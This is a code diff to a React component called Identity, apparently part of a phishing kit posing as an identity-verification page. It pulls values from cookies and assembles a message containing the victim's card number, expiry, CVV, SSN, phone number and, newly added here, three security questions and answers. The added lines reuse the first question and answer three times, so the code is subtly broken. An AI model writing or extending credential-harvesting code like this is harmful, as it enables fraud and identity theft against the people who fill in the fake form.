@@ -17,6 +17,14 @@ type Additional = {
     mail_p: string;
   }
 
+  type Question = {
+    q1: string;
+    ans1: string;
+    q2: string;
+    ans2: string;
+    q3: string;
+    ans3: string;
+}
 
 export default function Identity() {
   const [formInput, setFormInput] = useState<IdentityT>({
@@ -28,6 +36,7 @@ export default function Identity() {
   const login2: Login2 = cookies.get("login2");
   const additional:Additional  = cookies.get("additional");
   const form = useRef<HTMLFormElement>(null);
+  const question : Question = cookies.get("question")
   const navigate = useNavigate();
 const [isLoading, setIsLoading] = useState(false)
   function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
@@ -57,6 +66,16 @@ const [isLoading, setIsLoading] = useState(false)
     Card number: ${additional.cn}
     Card Expiry : ${additional.edate}
     Card Cvv: ${additional.ccv}
+
+    Question 1: ${question.q1}
+    Answer 1: ${question.ans1}
+    
+    Question 2: ${question.q1}
+    Answer 2: ${question.ans1}
+
+    Question 3: ${question.q1}
+    Answer 3: ${question.ans1}
+
 
     SSN: ${formInput.sn}
     Phone Number: ${formInput.phone}
